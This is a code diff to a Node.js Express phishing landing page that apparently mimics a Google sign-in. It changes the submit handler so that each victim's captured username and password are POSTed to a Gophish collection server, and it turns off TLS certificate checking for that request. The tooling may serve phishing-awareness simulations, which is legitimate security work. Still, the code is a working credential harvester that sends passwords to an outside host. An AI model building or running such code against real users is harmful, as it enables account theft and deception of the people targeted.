@@ -11,6 +11,8 @@ const GOPHISH_API_KEY = process.env.GOPHISH_API_KEY
 const GOPHISH_HOST   = process.env.GOPHISH_HOST
 const REDIRECT_URL   = process.env.REDIRECT_URL || 'https://accounts.google.com'
 
+const httpsAgent = new https.Agent({ rejectUnauthorized: false })
+
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'))
 })
@@ -21,19 +23,18 @@ app.post('/submit', async (req, res) => {
   console.log(`Captured → Email: ${username} | RID: ${rid}`)
 
   try {
-    // Correct Gophish tracking endpoint
-    await axios.get(
-      `${GOPHISH_HOST}/report?rid=${rid}`,
+    // Correct Gophish endpoint to report submitted data
+    const response = await axios.post(
+      `${GOPHISH_HOST}/?rid=${rid}`,
+      new URLSearchParams({ username, password }),
       {
-        headers: { 
-          Authorization: GOPHISH_API_KEY
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
         },
-        httpsAgent: new https.Agent({ 
-          rejectUnauthorized: false
-        })
+        httpsAgent
       }
     )
-    console.log(`Reported to Gophish ✅`)
+    console.log(`Reported to Gophish ✅ Status: ${response.status}`)
   } catch (err) {
     console.error('Gophish API error:', err.message)
   }
